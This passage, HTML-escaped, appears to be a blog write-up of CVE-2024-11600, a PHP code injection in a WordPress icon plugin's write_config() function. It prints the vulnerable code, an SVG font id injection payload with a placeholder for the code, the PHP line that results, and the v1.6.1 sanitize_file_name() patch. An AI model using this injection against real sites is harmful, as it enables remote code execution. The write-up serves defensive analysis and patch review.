class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Safely&amp;ensp;build&amp;ensp;the&amp;ensp;PHP&amp;ensp;array&amp;ensp;with&amp;ensp;sanitized&amp;ensp;content&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;json_config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icon&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$info&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$info&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$delimiter&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$safe_icon&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_attr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icon&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$safe_class&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_attr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;class&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$safe_tags&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_attr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tags&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;fwrite&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\r\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;$icons[\&amp;#39;&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\&amp;#39;][&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$delimiter&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$safe_icon&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$delimiter&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;]&amp;ensp;=&amp;ensp;array(&amp;#34;class&amp;#34;=&amp;gt;&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$delimiter&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$safe_class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$delimiter&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#34;tags&amp;#34;=&amp;gt;&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$delimiter&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$safe_tags&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$delimiter&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;);&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;delete_folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Error&amp;ensp;generating&amp;ensp;the&amp;ensp;configuration&amp;ensp;file.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;borderless&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;fclose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$handle&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;delete_folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Error&amp;ensp;generating&amp;ensp;the&amp;ensp;configuration&amp;ensp;file.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;borderless&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;write_config()&lt;/code&gt; function writes the icon configuration into a PHP file. Each icon is stored as:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$icons&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;ip_name&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;icon_name&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;class&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;class&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tags&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;tags&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Before being written to the file, this value is taken from the &lt;code&gt;id&lt;/code&gt; attribute of the &lt;code&gt;&amp;lt;font&amp;gt;&lt;/code&gt; tag in the SVG and passed through:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$font_attr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt; only removes HTML tags, control characters, and excessive whitespace. It does &lt;strong&gt;not&lt;/strong&gt; prevent dangerous special characters in a PHP context (such as &lt;code&gt;&#39;&lt;/code&gt;, &lt;code&gt;]&lt;/code&gt;, &lt;code&gt;;&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;As a result, an attacker can inject a payload into the &lt;code&gt;id&lt;/code&gt; attribute of the SVG:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;font&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;id=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#39;];&amp;ensp;php_code;//&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The line written to the file then becomes:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$icons&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;php_code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//&amp;#39;][&amp;#39;&amp;lt;icon_name&amp;gt;&amp;#39;]&amp;ensp;=&amp;ensp;array(&amp;#34;class&amp;#34;=&amp;gt;&amp;#39;&amp;lt;class&amp;gt;&amp;#39;,&amp;#34;tags&amp;#34;=&amp;gt;&amp;#39;&amp;lt;tags&amp;gt;&amp;#39;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;The patch (v1.6.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_file_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;unknown&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch replaces &lt;code&gt;sanitize_text_field()&lt;/code&gt; with &lt;code&gt;sanitize_file_name()&lt;/code&gt;, which removes all dangerous special characters (&lt;code&gt;&#39;&lt;/code&gt;, &lt;code&gt;&amp;quot;&lt;/code&gt;, &lt;code&gt;;&lt;/code&gt;, &lt;code&gt;|&lt;/code&gt;, &lt;code&gt;..&lt;/code&gt;, whitespace, complex Unicode, etc.) and normalizes the string into a safe file/key name. This prevents payload injection that could break PHP syntax in the configuration file.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/diff.png&#34; title=&#34;Changes introduced by the patch&#34; data-thumbnail=&#34;/posts/2025-12-06-cve-2024-11600/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Changes introduced by the patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-06-cve-2024-11600/diff.png&#39; alt=&#34;Diff&#34; height=&#34;146&#34; width=&#34;1864&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Changes introduced by the patch&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 